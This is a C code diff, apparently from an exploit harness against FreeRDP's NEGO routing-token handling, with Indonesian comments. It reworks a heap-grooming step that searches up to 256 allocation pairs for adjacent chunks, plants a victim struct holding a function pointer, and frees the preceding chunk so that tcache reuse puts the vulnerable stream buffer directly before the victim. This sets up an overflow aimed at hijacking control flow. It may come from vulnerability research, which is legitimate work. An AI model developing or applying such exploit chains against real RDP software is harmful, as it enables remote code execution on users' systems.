@@ -114,28 +114,47 @@ int main(void)
 	if (!nego)
 		return 3;
 
-	/* --- 1. GROOMING --- */
-	unsigned char* A = (unsigned char*)malloc(STREAM_CHUNK);
-	if (!A)
-		return 3;
-	victim_t* B = (victim_t*)malloc(STREAM_CHUNK);
-	if (!B)
-		return 3;
+	/* --- 1. GROOMING ---
+	 * Heap sudah punya lubang dari alokasi awal FreeRDP, jadi tidak cukup berharap A/B berdampingan:
+	 * cari pasangan chunk yang BENAR-BENAR bersebelahan, lalu bebaskan A-nya sebagai tindakan terakhir
+	 * (tcache LIFO → malloc(512) milik Stream_New mengambil slot itu, dan B tepat di belakangnya). */
+#define PAIRS 256
+	static unsigned char* A_arr[PAIRS];
+	static victim_t* B_arr[PAIRS];
+	unsigned char* A = NULL;
+	victim_t* B = NULL;
+	int found = -1;
+	for (int i = 0; i < PAIRS; i++)
+	{
+		A_arr[i] = (unsigned char*)malloc(STREAM_CHUNK);
+		B_arr[i] = (victim_t*)malloc(STREAM_CHUNK);
+		if (!A_arr[i] || !B_arr[i])
+			return 3;
+		if ((long)((unsigned char*)B_arr[i] - A_arr[i]) == STREAM_CHUNK + CHUNK_HDR)
+		{
+			A = A_arr[i];
+			B = B_arr[i];
+			found = i;
+			break;
+		}
+	}
+	if (!A || !B)
+	{
+		printf("  [x] tak menemukan pasangan bersebelahan dalam %d percobaan — berhenti (tak mengklaim)\n",
+		       PAIRS);
+		return 2;
+	}
 	B->canary = 0xDEADBEEFCAFEBABEULL;
 	B->fn = target_fn;
 	B->tail = 0xFEEDFACECAFED00DULL;
-	const long gap = (long)((unsigned char*)B - A);
-	free(A);
 	g_victim = B;
 
 	printf("harness rantai — overflow nego → control-flow hijack\n");
-	printf("  grooming: A=%p B=%p selisih=%ld (payload + header = %d)\n", (void*)A, (void*)B, gap,
-	       STREAM_CHUNK + CHUNK_HDR);
-	if (gap != STREAM_CHUNK + CHUNK_HDR)
-	{
-		printf("  [x] chunk tidak bersebelahan — grooming tidak berlaku, tak bisa mengklaim apa pun\n");
-		return 2;
-	}
+	printf("  grooming: pasangan #%d A=%p B=%p selisih=%ld (payload + header = %d)\n", found, (void*)A,
+	       (void*)B, (long)((unsigned char*)B - A), STREAM_CHUNK + CHUNK_HDR);
+	free(A); /* terakhir dibebaskan → di kepala tcache untuk kelas 512 */
+	printf("  A dibebaskan; B (korban) tetap teralokasi tepat di belakangnya\n");
+	fflush(stdout);
 
 	/* --- 2. OVERFLOW (jalur rentan) --- */
 	if (!nego_set_routing_token(nego, token, (UINT32)TOKEN_LEN))
